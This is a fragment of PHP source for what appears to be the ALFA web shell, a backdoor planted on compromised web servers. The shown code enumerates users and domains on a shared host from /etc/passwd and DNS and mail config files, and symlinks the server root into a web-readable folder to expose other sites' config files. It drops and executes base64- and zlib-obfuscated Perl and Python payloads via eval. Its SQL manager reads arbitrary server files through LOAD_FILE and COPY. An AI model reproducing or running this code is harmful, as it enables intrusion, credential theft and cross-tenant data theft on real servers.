if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
echo "</div>";
alfafooter();}
function alfaMakePwd(){
	if(_alfa_file_exists("/etc/virtual/domainowners")||(_alfa_file_exists("/etc/named.conf")&&_alfa_file_exists("/etc/valiases"))){
		return "/home/{user}/public_html/";
	}
	$document = explode("/", $_SERVER["DOCUMENT_ROOT"]);
	$public = end($document);
	array_pop($document);
	array_pop($document);
	$path = implode("/", $document) . "/{user}/" . $public;
	return $path;
}
function alfaGetDomains($state = false){
	$state = "named.conf";
	$lines = array();
	$lines = _alfa_file('/etc/named.conf');
	if(!$lines){
		$lines = @scandir("/etc/valiases/");
		$state = "valiases";
		if(!$lines){
			$lines = @scandir("/var/named");
			$state = "named";
			if(!$lines && $state){
				$lines = _alfa_file('/etc/passwd');
				$state = "passwd";
			}
		}
	}
	return array("lines" => $lines, "state" => $state);
}
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__;
	if(!@is_dir($parent)){
		@mkdir($parent, 0755, true);
	}
}
function alfasymlink(){
alfahead();
AlfaNum(9,10);
alfaCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
echo '<div class=header><br><center><div class="txtfont_header">| Symlink |</div><center><h3><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symphp\')">| Symlink( php ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symperl\')">| Symlink( perl ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'sympy\')">| Symlink( python ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a></h3></center>';
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	$sympath = alfaMakePwd();
	@mkdir('cgialfa',0755);
	@chdir('cgialfa');
	alfacgihtaccess('cgi');
	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $alfa_data="'.__ALFA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
	$py = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
	$cginame = "symperl.alfa";
	$source = $perl;
	$lang = "perl";
	if($_POST["alfa2"]=="sympy"){
		$cginame = "pysymlink.alfa";
		$source = $py;
		$lang = "python";
	}
	@__write_file($cginame,$source);
	@chmod($cginame,0755);
	echo __pre();
	$resource = alfaEx("{$lang} {$cginame} {$sympath}",false,true,true);
	if(strlen($resource) == 0){
		echo AlfaiFrameCreator('cgialfa/'.$cginame);
	}else{
		echo $resource;
	}
}
if(isset($_POST['alfa4']) && $_POST['alfa4']=='SymFile'){
if(function_exists('symlink')||_alfa_can_runCommand(true,true)){
AlfaNum(9,10);
echo __pre().'
<center><p><div class="txtfont_header">| Symlink File And Directory |</div></p><form onSubmit="g(\'symlink\',null,null,null,null,\'SymFile\',this.file.value,this.symfile.value,this.symlink.value);return false;" method="post">
<input type="text" name="file" placeholder="Example : /home/user/public_html/config.php" size="60"/><br />
<input type="text" name="symfile" placeholder="Example : alfa.txt" size="60"/>
<p><input type="submit" value=" " name="symlink" /></p></form></center>';
$path = $_POST['alfa5'];
$symname = $_POST['alfa6'];
$solevisible58 = $_POST['alfa7'];
if($solevisible58){
$new_name = str_replace(".", "_", basename($symname));
$rand_dir = $new_name.rand(111,9999);
$sym_dir = 'alfasymlinkphp/'.$rand_dir.'/';
@mkdir($sym_dir, 0777, true);
alfacgihtaccess('sym', $sym_dir, $symname);
_alfa_symlink("$path","$sym_dir/$symname");
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__ALFA_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
}
if(isset($_POST['alfa2']) && $_POST['alfa2']=='symphp'){
$cant_symlink = true;
if(function_exists('symlink')||_alfa_can_runCommand(false,false)){
@mkdir('alfasymlink',0777);
alfacgihtaccess('sym','alfasymlink/');
_alfa_symlink('/','alfasymlink/root');
$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#FFFFFF;'><b>Users</span></b></td><td><span style='color:#FF0000;'><b>symlink</span></b></td>";
if(_alfa_file_exists("/etc/named.conf") && !_alfa_file_exists("/etc/virtual/domainowners") && _alfa_file_exists("/etc/valiases/")){
echo "<center>";
$lines = array();
$anony_domains = array();
$anonymous_users = array();
$f_black = array();
$error = false;
$anonymous = false;
$makepwd = "/home/{user}/public_html/";
$domains = alfaGetDomains();
$lines = $domains["lines"];
$state = $domains["state"];
$is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
$can_runcmd = _alfa_can_runCommand(false,false);
if(!$is_posix && !$can_runcmd){
	$anonymous = true;
	$anony_domains = $domains["lines"];
	$lines = _alfa_file('/etc/passwd');
}
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
foreach($lines as $line){
	$domain = "";
	$owner = "";
	if($anonymous){
		$explode = explode(":", $line);
		$owner = $explode[0];
		$owner_len = strlen($owner) - 1;
		$userid = $explode[2];
		if((int)$userid < 500)continue;
		$domain = "[?????]";
		$temp_black = array();
		$finded = false;
		foreach($anony_domains as $anony){
			if($state == "named.conf"){
				if(@strstr($anony, 'zone')){
					preg_match_all('#zone "(.*)"#',$anony, $data);
					$domain = $data[1][0];
				}else{
					continue;
				}
			}elseif($state == "named" || $state == "valiases"){
				if($anony == "." || $anony == "..")continue;
				if($state == "named")$anony = rtrim($anony, ".db");
				$domain = $anony;
			}
			$sub_domain = str_replace(array("-","."), "", $domain);
			if(substr($owner, 0, $owner_len) == substr($sub_domain, 0, $owner_len)){
				if(in_array($owner.$domain, $temp_black))continue;
				$sympath = str_replace("{user}", $owner, $makepwd);
				$http = "http://".$domain;
				echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
				$count++;
				$temp_black[] = $owner.$domain;
				$finded = true;
			}
		}
		if(!$finded){$anonymous_users[] = $owner;
		}
	}else{
 		if($state == "named.conf"){
			if(@strstr($line, 'zone')){
				preg_match_all('#zone "(.*)"#',$line, $data);
				$domain = $data[1][0];
			}else{
				continue;
			}
		}elseif($state == "named" || $state == "valiases"){
			if($line == "." || $line == "..")continue;
			if($state == "named")$line = rtrim($line, ".db");
			$domain = $line;
		}
		if(strlen(trim($domain)) > 2 && $state != "passwd"){
			if(!_alfa_file_exists('/etc/valiases/'.$domain, false))continue;
			if($is_posix){
				$user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
				$owner = $user["name"];
			}elseif($can_runcmd){
				$owner = alfaEx("stat -c '%U' /etc/valiases/".$domain,false,false);
			}
		}
	}
	if(!$anonymous){
		if(strlen($owner)==0 || in_array($owner.$domain, $f_black))continue;
		$sympath = str_replace("{user}", $owner, $makepwd);
		$http = "http://".$domain;
		if($state == "passwd"){
			$http = "javascript:alert('we cant find domain...')";
		}
		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
		$count++;
		$f_black[] = $owner.$domain;
	}
}
if($anonymous){
	foreach($anonymous_users as $owner){
		$sympath = str_replace("{user}", $owner, $makepwd);
		$http = "javascript:alert('we cant find domain...')";
		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, "[????]", $owner, $sympath), $template);
		$count++;
	}
}
$cant_symlink = false;
}else{
$is_direct = false;
$makepwd = alfaMakePwd();
if(_alfa_file_exists("/etc/virtual/domainowners")){
	$makepwd = "/home/{user}/public_html";
	$is_direct = true;
}
$sole = _alfa_file("/etc/virtual/domainowners");
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
	foreach($sole as $visible){
		if(@strstr($visible,":")){
			$solevisible = explode(':', $visible);
			$cwd = str_replace("{user}", trim($solevisible[1]), $makepwd);
			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($solevisible[1]), trim($solevisible[0]), $cwd), $template);
		}
	}
}else{
	$passwd = _alfa_file("/etc/passwd");
	if($passwd){
		$html = "";
		$is_named = false;
		$users = array();
		$domains = array();
		$uknowns = array();
		foreach($passwd as $user){
			$user = trim($user);
			$expl = explode(":", $user);
			if((int)$expl[2] < 500)continue;
			$users[$expl[0]] = $expl[5];
		}
		$site_domains = @scandir("/etc/virtual/");
		if(!$site_domains){
			$site_domains = alfaEx("ls /etc/virtual/");
			$site_domains = explode("\n", $site_domains);
			if(!$site_domains){
				$site_domains = _alfa_file("/etc/named.conf");
				if($site_domains){$is_named = true;}
			}
		}
		foreach($site_domains as $line){
			if($is_named){
				if(@strstr($line, 'zone')){
					preg_match_all('#zone "(.*)"#',$line, $data);
					$domain = $data[1][0];
					if(strlen($domain  > 2) && !empty($domain)){
						$domains[] = $domain;
					}
				}
			}else{
				$domains[] = $line;
			}
		}
		$x = 1;
		foreach($users as $user => $home){
			foreach($domains as $domain){
				$user_len = strlen($user) - 1;
				$sub_domain = str_replace(array("-","."), "", $domain);
				$five_user = substr($user, 0,$user_len);
				$five_domain = substr($sub_domain, 0,$user_len);
				if($five_user == $five_domain){
					if($is_direct){
						$cwd = str_replace("{user}", $user, $makepwd);
					}else{
						$expl = explode("}/", $makepwd);
						$cwd = $home."/".$expl[1];
					}
					$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, $domain, $cwd), $template);
				}else{
					$uknowns[$user] = $home;
				}
			}
		}
		$uknowns = array_unique($uknowns);
		foreach($uknowns as $user => $home){
			if($is_direct){
				$cwd = str_replace("{user}", $user, $makepwd);
			}else{
				$expl = explode("}/", $makepwd);
				$cwd = $home."/".$expl[1];
			}
			$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, "[?????]",$cwd), $template);}
		echo($html);
	}
}
echo "</table>";
$cant_symlink = false;
}
}else{
	echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
	$cant_symlink = false;
}
if($cant_symlink)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">Error...</font></b><br>';
echo "</center></table>";
}
echo "</div>";
alfafooter();
}
function alfasql(){
class DbClass{
public $type;
public $link;
public $res;
public $mysqli_connect_error = false;
public $mysqli_connect_error_msg = "";
function __construct($type){
$this->type = $type;
}
function connect($host, $user, $pass, $dbname){
switch($this->type){
case 'mysql':
if($this->link = @mysqli_connect($host,$user,$pass,$dbname)){
	return true;
}else{
	$this->mysqli_connect_error = true;
	$this->mysqli_connect_error_msg = mysqli_connect_error();
	return false;
}
break;
case 'pgsql':
$host = explode(':', $host);
if(!$host[1]) $host[1]=5432;
if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
break;
}
return false;
}
function selectdb($db){
switch($this->type){
case 'mysql':
if(@mysqli_select_db($db))return true;
break;
}
return false;
}
function query($str){
switch($this->type){
case 'mysql':
return $this->res = @mysqli_query($this->link,$str);
break;
case 'pgsql':
return $this->res = @pg_query($this->link,$str);
break;
}
return false;
}
function fetch(){
$res = func_num_args()?func_get_arg(0):$this->res;
switch($this->type){
case 'mysql':
return @mysqli_fetch_assoc($res);
break;
case 'pgsql':
return @pg_fetch_assoc($res);
break;
}
return false;
}
function listDbs(){
switch($this->type){
case 'mysql':
return $this->query("SHOW databases");
break;
case 'pgsql':
return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
break;
}
return false;
}
function listTables(){
switch($this->type){
case 'mysql':
return $this->res = $this->query('SHOW TABLES');
break;
case 'pgsql':
return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
break;
}
return false;
}
function error(){
switch($this->type){
case 'mysql':
return @mysqli_error($this->link);
break;
case 'pgsql':
return @pg_last_error();
break;
}
return false;
}
function setCharset($str){
switch($this->type){
case 'mysql':
if(function_exists('mysql_set_charset'))
return @mysqli_set_charset($this->link,$str);
else
$this->query('SET CHARSET '.$str);
break;
case 'pgsql':
return @pg_set_client_encoding($this->link, $str);
break;
}
return false;
}
function loadFile($str){
switch($this->type){
case 'mysql':
return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
break;
case 'pgsql':
$this->query("CREATE TABLE solevisible(file text);COPY solevisible FROM '".addslashes($str)."';select file from solevisible;");
$r=array();
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('drop table solevisible');
return array('file'=>implode("\n",$r));
break;
}
return false;
}
};
$db = new DbClass($_POST['type']);
alfahead();
$form_visibility = "table";
if(isset($_POST['sql_host'])){
	$connection_db = $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
	if($connection_db && !empty($_POST['sql_base'])){
		$form_visibility = "none";
	}
}
$database_list = array();
echo "
<div class='header' style='min-height:300px;'>".($form_visibility!="none"?"<center><div class='txtfont_header'>| Sql Manager |</div><p>".getConfigHtml('all')."</p></center><div style='text-align:center;margin-bottom: 10px;'><button class='connection-his-btn db-opt-id' onclick='alfaShowConnectionHistory(this);' mode='on'>Connection History</button><div class='connection_history_holder'></div></div>":"")."
<div class='sf' class='db-opt-id'><table style='margin: 0 auto;".($form_visibility=="none"?"display:none;":"")."' cellpadding='2' cellspacing='0'><tr>
<td><div class=\"txtfont\">TYPE</div></td><td><div class=\"txtfont\">HOST</div></td><td><div class=\"txtfont\">DB USER</div></td><td><div class=\"txtfont\">DB PASS</div></td><td><div class=\"txtfont\">DB NAME</div></td><td></td></tr><tr>
<td><select name='type'><option value='mysql' selected>mysql</option></select></td>
<td><input type='text' name='sql_host' id='db_host' value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td>
<td><input type='text' name='sql_login' id='db_user' value='". (empty($_POST['sql_login'])?'':htmlspecialchars($_POST['sql_login'])) ."'></td>
<td><input type='text' name='sql_pass' id='db_pw' value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
$tmp = "<input type='text' name='sql_base' id='db_name' value='". (empty($_POST['sql_base'])?'':htmlspecialchars($_POST['sql_base'])) ."'>";
if(isset($_POST['sql_host'])){
if($connection_db){
$db->setCharset('utf8');
$db->listDbs();
echo "<select name=sql_base><option value=''></option>";
while($item = $db->fetch()) {
list($key, $value) = each($item);
$database_list[] = $value;
echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
}
echo '</select>';
}else{
	echo $tmp;
}
}else
echo $tmp;
$curr_mysql_id = $_POST['current_mysql_id'];
echo "</td>
<td><button onclick='fs(this);return false;' class='db-opt-id db-connect-btn'>Connect</button></td>
<td><input type='checkbox' name='sql_count' value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> <div class=\"txtfont\">count the number of rows</div></td>
</tr>
</table>";
if($db->mysqli_connect_error){
	echo '<div style="text-align: center;font-size: 17px;margin-top: 18px;">'.$db->mysqli_connect_error_msg.'</div>';
}
if(!empty($curr_mysql_id)){
	$sql_title_db = "";
	if(!empty($_POST['sql_base'])){
		$sql_title_db = "d.querySelector('#tab_".$curr_mysql_id." span').innerHTML='".addslashes($_POST['sql_base'])."';";
	}
	echo "<script>mysql_cache['".$curr_mysql_id."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$curr_mysql_id."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$curr_mysql_id."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$curr_mysql_id."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$curr_mysql_id."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$curr_mysql_id."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$curr_mysql_id."']['count']='".addslashes($_POST['sql_count'])."';".$sql_title_db."alfaConnectionHistoryUpdate();</script>";
}
if(isset($db) && $db->link){
if(!empty($_POST['sql_base'])){
echo "<div class='mysql-main'><div mode='block' onclick='alfaMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='alfaMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='".(empty($_POST['sql_count'])?"false":"true")."' mode='closed' onclick='alfaMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='http://solevisible.com/icons/menu/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
foreach ($database_list as $db_name) {
	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$db_name.'" onclick="alfaMysqlExpander(this);" class="expander cls-'.$db_name.'-expander db-opt-id" href="javascript:void(0);"><img src="http://solevisible.com/icons/menu/'.($db_name == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$db_name.'</span><div class="clearfloat"></div><div db_name="'.$db_name.'" mode="'.($db_name == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$db_name.'"><div>';
	if($db_name == $_POST['sql_base']){$db->selectdb($_POST['sql_base']);
		$tbls_res = $db->listTables();
		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';
		while($item = $db->fetch($tbls_res)){
		list($key, $value) = each($item);
		if(!empty($_POST['sql_count']))
		$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM `'.$value.'`'));
		$value = htmlspecialchars($value);
		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a class='db-opt-id' db_target='".$db_name."' href='javascript:void(0);' onclick=\"alfaLoadTableData(this,'".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</div></li>";
		}
